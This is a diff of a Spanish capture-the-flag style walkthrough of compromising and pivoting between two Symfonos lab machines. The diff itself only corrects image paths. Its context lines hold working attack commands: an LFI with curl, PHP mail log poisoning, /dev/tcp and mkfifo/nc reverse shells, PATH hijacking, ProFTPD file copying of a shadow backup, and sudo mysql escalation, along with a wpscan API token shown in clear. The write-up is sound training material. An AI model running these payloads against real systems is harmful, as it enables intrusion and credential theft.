@@ -39,11 +39,11 @@ nmap -sVC -n -Pn -p22,25,80,139,445 -vvv --min-rate 5000 -oN version 192.168.0.3
 
 ![Pasted image 20251109152555.png](Pasted%20image%2020251109152555.png)
 ![Pasted image 20251109152636.png](Pasted%20image%2020251109152636.png)
-![Pasted image 20251109152701](../../../Anexos/Pasted%20image%2020251109152701.png)
+![Pasted image 20251109152701](../../Anexos/Pasted%20image%2020251109152701.png)
 
 Primero compruebo que en la web no hay nada visible de primeras, solo una foto:
 
-![Pasted image 20251109153101](../../../Anexos/Pasted%20image%2020251109153101.png)
+![Pasted image 20251109153101](../../Anexos/Pasted%20image%2020251109153101.png)
 
 Un buen punto de partida es mirar con smbmap si podemos ver algún recurso compartido usando la herramienta smbmap con el siguiente comando:
 
@@ -59,7 +59,7 @@ Aquí podemos ver tanto un usuario llamado helios como un recurso compartido sob
 smbmap -H 192.168.0.30 -r anonymous
 ```
 
-![Pasted image 20251109153640](../../../Anexos/Pasted%20image%2020251109153640.png)
+![Pasted image 20251109153640](../../Anexos/Pasted%20image%2020251109153640.png)
 
 Ahora voy a descargarme el recurso attention.txt usando el siguiente comando:
 
@@ -94,7 +94,7 @@ En el archivo research no vemos nada raro, pero en el archivo todo.txt vemos que
 
 Se trata de un wordpress, pero por la estética parece que se está aplicando virtual hosting y necesitamos añadir el dominio al archivo /etc/hosts. Para localizar ese dominio simplemente echo un vistazo al código fuente de la web y veo que es symfonos.local. Una vez añadido vemos lo siguiente:
 
-![Pasted image 20251109161657](../../../Anexos/Pasted%20image%2020251109161657.png)
+![Pasted image 20251109161657](../../Anexos/Pasted%20image%2020251109161657.png)
 
 Tenemos al usuario admin del wordpress, pero antes voy a utilizar la herramienta wpscan para intentar listar usuarios y plugins, con el siguiente comando:
 
@@ -102,7 +102,7 @@ Tenemos al usuario admin del wordpress, pero antes voy a utilizar la herramienta
 wpscan --url http://symfonos.local/h3l105/ --enumerate u,vp --api-token OWzGUYK83WWnTTXAiYGHSt7ko8w7tZ6uAU8ridGzIlw
 ```
 
-![Pasted image 20251109162412](../../../Anexos/Pasted%20image%2020251109162412.png)
+![Pasted image 20251109162412](../../Anexos/Pasted%20image%2020251109162412.png)
 
 Hacemos una búsqueda en searchsploit con el siguiente comando para buscar y ver el exploit:
 
@@ -110,19 +110,19 @@ Hacemos una búsqueda en searchsploit con el siguiente comando para buscar y ver
 searchsploit mail masta
 ```
 
-![Pasted image 20251109162829](../../../Anexos/Pasted%20image%2020251109162829.png)
+![Pasted image 20251109162829](../../Anexos/Pasted%20image%2020251109162829.png)
 
 ```bash
 searchsploit -x php/webapps/40290.txt
 ```
 
-![Pasted image 20251109162736](../../../Anexos/Pasted%20image%2020251109162736.png)
+![Pasted image 20251109162736](../../Anexos/Pasted%20image%2020251109162736.png)
 
 ```bash
 curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/lists/csvexport.php?pl=/etc/passwd"
 ```
 
-![Pasted image 20251110152028](../../../Anexos/Pasted%20image%2020251110152028.png)
+![Pasted image 20251110152028](../../Anexos/Pasted%20image%2020251110152028.png)
 
 Como tenemos el usuario helios descubierto, el puerto 25 abierto y capacidad de listar archivos, podemos intentar enviarle un mail al usuario helios utilizando telnet por el puerto 25 para enviarle una cadena de php maliciosa donde nos permita hacer una ejecución remota de comandos:
 
@@ -136,7 +136,7 @@ DATA
 quit
 ```
 
-![Pasted image 20251110165013](../../../Anexos/Pasted%20image%2020251110165013.png)
+![Pasted image 20251110165013](../../Anexos/Pasted%20image%2020251110165013.png)
 
 Ahora podemos intentar ejecutar un comando con el parámetro cmd leyendo el mail que le acabamos de enviar al usuario helios. Estos mails se encuentran en la siguiente ruta:
 
@@ -150,7 +150,7 @@ Con lo cual, usando la vulnerabilidad del local file inclusion podemos intentar 
 curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/lists/csvexport.php?pl=/var/mail/helios&cmd=whoami"
 ```
 
-![Pasted image 20251110165543](../../../Anexos/Pasted%20image%2020251110165543.png)
+![Pasted image 20251110165543](../../Anexos/Pasted%20image%2020251110165543.png)
 
 Ahora evidentemente voy a ejecutar una reverse shell con el siguiente comando después de ponerme en escucha con netcat por el puerto 443:
 
@@ -158,7 +158,7 @@ Ahora evidentemente voy a ejecutar una reverse shell con el siguiente comando de
 http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/lists/csvexport.php?pl=/var/mail/helios&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.0.28/443%200%3E%261%22
 ```
 
-![Pasted image 20251110185841](../../../Anexos/Pasted%20image%2020251110185841.png)
+![Pasted image 20251110185841](../../Anexos/Pasted%20image%2020251110185841.png)
 
 Después de hacer un tratamiento de la TTY, somos el usuario helios ejecuto el siguiente comando para buscar archivos en todo el sistema que tengan persmisos de SUID asignados:
 
@@ -166,11 +166,11 @@ Después de hacer un tratamiento de la TTY, somos el usuario helios ejecuto el s
 find / -perm -4000 2>/dev/null
 ```
 
-![Pasted image 20251111151357](../../../Anexos/Pasted%20image%2020251111151357.png)
+![Pasted image 20251111151357](../../Anexos/Pasted%20image%2020251111151357.png)
 
 Observo este binario, que tras ejecutarlo arroja lo siguiente:
 
-![Pasted image 20251111151436](../../../Anexos/Pasted%20image%2020251111151436.png)
+![Pasted image 20251111151436](../../Anexos/Pasted%20image%2020251111151436.png)
 
 Ahora lo reviso con el comando strings:
 
@@ -180,7 +180,7 @@ strings statuscheck
 
 Aquí veo que se está ejecutando el comando curl pero de forma relativa, con lo que es muy viable hacer un secuestro del path:
 
-![Pasted image 20251111151924](../../../Anexos/Pasted%20image%2020251111151924.png)
+![Pasted image 20251111151924](../../Anexos/Pasted%20image%2020251111151924.png)
 
 Esto ahora canta a Path hijacking, así que el proceso a seguir es crear un archivo llamado **curl** en una ruta en la que tenga permisos de lectura y escritura, como /tmp, con la siguiente línea de código:
 
@@ -207,8 +207,8 @@ ls -la /bin/bash
 bash -p
 ```
 
-![Pasted image 20251112104825](../../../Anexos/Pasted%20image%2020251112104825.png)
-![Pasted image 20251112120007](../../../Anexos/Pasted%20image%2020251112120007.png)
+![Pasted image 20251112104825](../../Anexos/Pasted%20image%2020251112104825.png)
+![Pasted image 20251112120007](../../Anexos/Pasted%20image%2020251112120007.png)
 
 Ahora la máquina ya está rooteada, aunque este paso no es estrictamente necesario para hacer el pivoting.
 
@@ -216,7 +216,7 @@ Ahora la máquina ya está rooteada, aunque este paso no es estrictamente necesa
 ___
 Una vez gano acceso a la primera máquina, ejecuto el comando **ip a** y veo lo siguiente:
 
-![Pasted image 20251112142434](../../../Anexos/Pasted%20image%2020251112142434.png)
+![Pasted image 20251112142434](../../Anexos/Pasted%20image%2020251112142434.png)
 
 La ip **192.168.0.30** es la ip que veía desde mi máquina atacante, y la que me interesa ahora es la ip **10.10.10.129** ya que es en ese segmento de red donde voy a tratar de vulnerar la máquina de la red interna.
 Para el pivoting voy a utilizar chisel y socat.
@@ -227,7 +227,7 @@ Primero voy a hacer un reconocimiento de la interfaz de red **ens33**, pero como
 seq 1 254 | xargs -P 50 -I {} bash -c 'ping -c 1 -W 1 10.10.10.{} &> /dev/null && echo "[+] El host 10.10.10.{} - ACTIVO"'
 ```
 
-![Pasted image 20251112212333](../../../Anexos/Pasted%20image%2020251112212333.png)
+![Pasted image 20251112212333](../../Anexos/Pasted%20image%2020251112212333.png)
 
 Ahora, sabiendo que la ip de la máquina víctima es la 10.10.10.128, voy a utilizar otro oneliner pero esta vez para hacer un descubrimiento de puertos abiertos:
 
@@ -235,7 +235,7 @@ Ahora, sabiendo que la ip de la máquina víctima es la 10.10.10.128, voy a util
 seq 1 65535 | xargs -P 500 -I PORT bash -c 'timeout 1 bash -c "echo > /dev/tcp/10.10.10.128/PORT" 2>/dev/null && echo "[+] Puerto PORT - ABIERTO"'
 ```
 
-![Pasted image 20251112212804](../../../Anexos/Pasted%20image%2020251112212804.png)
+![Pasted image 20251112212804](../../Anexos/Pasted%20image%2020251112212804.png)
 
 Ahora voy a comenzar con chisel y socat a hacer el port forwarding. Primero me pongo en escucha con chisel en mi máquina atacante usando el siguiente comando:
 
@@ -257,13 +257,13 @@ Voy a hacer un escaneo de nmap de los puertos de la máquina de la red interna c
 sudo proxychains4 nmap -sT -Pn -n 10.10.10.128 --top-ports 500 -oN ports_10.10.10.128
 ```
 
-![Pasted image 20251115160733](../../../Anexos/Pasted%20image%2020251115160733.png)
+![Pasted image 20251115160733](../../Anexos/Pasted%20image%2020251115160733.png)
 
 ```bash
  sudo proxychains4 nmap -sCV -n -v -Pn -p21,22,80,139,445 10.10.10.128 -oN version_10.10.10.128
 ```
 
-![Pasted image 20251115160840](../../../Anexos/Pasted%20image%2020251115160840.png)
+![Pasted image 20251115160840](../../Anexos/Pasted%20image%2020251115160840.png)
 
 En este punto, viendo que el puerto 445 está abierto, voy a utilizar smbmap para listar archivos y recursos compartidos, usando el siguiente comando:
 
@@ -271,7 +271,7 @@ En este punto, viendo que el puerto 445 está abierto, voy a utilizar smbmap par
 proxychains smbmap -H 10.10.10.128
 ```
 
-![Pasted image 20251115162112](../../../Anexos/Pasted%20image%2020251115162112.png)
+![Pasted image 20251115162112](../../Anexos/Pasted%20image%2020251115162112.png)
 
 Ahora lo listamos:
 
@@ -279,23 +279,23 @@ Ahora lo listamos:
 smbmap -H 10.10.10.128 -r anonymous
 ```
 
-![Pasted image 20251115162249](../../../Anexos/Pasted%20image%2020251115162249.png)
+![Pasted image 20251115162249](../../Anexos/Pasted%20image%2020251115162249.png)
 
 ```bash
 sudo proxychains4 smbmap -H 10.10.10.128 --download 'anonymous/backups/log.txt'
 ```
 
-![Pasted image 20251118102214](../../../Anexos/Pasted%20image%2020251118102214.png)
+![Pasted image 20251118102214](../../Anexos/Pasted%20image%2020251118102214.png)
 
 Aquí ya vemos el primer dato interesante, que es una copia del archivo shadow en la ruta /var/backups/shadow.bak
 
-![Pasted image 20251118102328](../../../Anexos/Pasted%20image%2020251118102328.png)
+![Pasted image 20251118102328](../../Anexos/Pasted%20image%2020251118102328.png)
 
 También vemos al usuario aeolus.
 
 En este punto, ya me había fijado en otra cosa, y es que la versión del servicio PROFTPD es algo obsoleta, y haciendo una búsqueda en searchsploit veo lo siguiente:
 
-![Pasted image 20251118102500](../../../Anexos/Pasted%20image%2020251118102500.png)
+![Pasted image 20251118102500](../../Anexos/Pasted%20image%2020251118102500.png)
 
 Tenemos una forma potencial de lectura de archivos sin necesidad de estar autenticados. Revisando el arvhivo .txt del exploit, veo que nos permite usar los comandos **ctfr** y **cpto** para copiar y mover un archivo de una ruta a otra, así que lo que haré es conectarme por ftp y tratar de copiar el archivo shadow.bak al directorio compartido de anonymous para posteriormente traerlo a mi máquina local.
 
@@ -309,7 +309,7 @@ site cpto /home/aeolus/share/shadow.bak
 quit
 ```
 
-![Pasted image 20251118103206](../../../Anexos/Pasted%20image%2020251118103206.png)
+![Pasted image 20251118103206](../../Anexos/Pasted%20image%2020251118103206.png)
 
 Ahora lo revisamos con smbmap y nos traemos el archivo a la máquina local:
 
@@ -353,7 +353,7 @@ Ahora para escalar privilegios, debo usar el comando:
 ss -nltp
 ```
 
-![Pasted image 20251118210910](../../../Anexos/Pasted%20image%2020251118210910.png)
+![Pasted image 20251118210910](../../Anexos/Pasted%20image%2020251118210910.png)
 
 La máquina tiene un puerto interno abierto, el 8080, así que vamos a aplicar local port forwarding para ver este servicio desde mi localhost:
 
@@ -361,11 +361,11 @@ La máquina tiene un puerto interno abierto, el 8080, así que vamos a aplicar l
 sudo proxychains4 ssh aeolus@10.10.10.128 -L 8080:127.0.0.1:8080
 ```
 
-![Pasted image 20251118212309](../../../Anexos/Pasted%20image%2020251118212309.png)
+![Pasted image 20251118212309](../../Anexos/Pasted%20image%2020251118212309.png)
 
 
 
-![Pasted image 20251118212928](../../../Anexos/Pasted%20image%2020251118212928.png)
+![Pasted image 20251118212928](../../Anexos/Pasted%20image%2020251118212928.png)
 
 Este software tiene una forma de vulnerarse en la que ponemos en el campo de comunity un comando para que se produzca una RCE. El one liner viene especificado dentro del payload de searchsploit, y es el siguiente:
 
@@ -373,7 +373,7 @@ Este software tiene una forma de vulnerarse en la que ponemos en el campo de com
 '$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.129 4646 >/tmp/f) #
 ```
 
-![Pasted image 20251118214725](../../../Anexos/Pasted%20image%2020251118214725.png)
+![Pasted image 20251118214725](../../Anexos/Pasted%20image%2020251118214725.png)
 
 Antes de darle a añadir device para que se ejecute, debemos redireccionar el flujo de la ejecución para que la reverse shell llegue a nuestra máquina de atacante. Para esto, lo que voy a hacer es ejecutar el siguiente comando de socat en la máquina **SYMFONOS** **1**, con IP **10.10.10.129**, para que se redirija el flujo **desde la 10.10.10.129 hacia la 192.168.0.28** que es mi máquina de atacante. El comando de socat es el siguiente:
 
@@ -395,7 +395,7 @@ sudo -l
 
 Ahora, en GTFObins vemos lo siguiente:
 
-![Pasted image 20251118215551](../../../Anexos/Pasted%20image%2020251118215551.png)
+![Pasted image 20251118215551](../../Anexos/Pasted%20image%2020251118215551.png)
 
 ```bash
 sudo -u root mysql -e '\! /bin/bash'
@@ -403,6 +403,6 @@ sudo -u root mysql -e '\! /bin/bash'
 
 Ejecutamos el comando y....
 
-![Pasted image 20251118215749](../../../Anexos/Pasted%20image%2020251118215749.png)
+![Pasted image 20251118215749](../../Anexos/Pasted%20image%2020251118215749.png)
 
-![Pasted image 20251118215858](../../../Anexos/Pasted%20image%2020251118215858.png)
+![Pasted image 20251118215858](../../Anexos/Pasted%20image%2020251118215858.png)
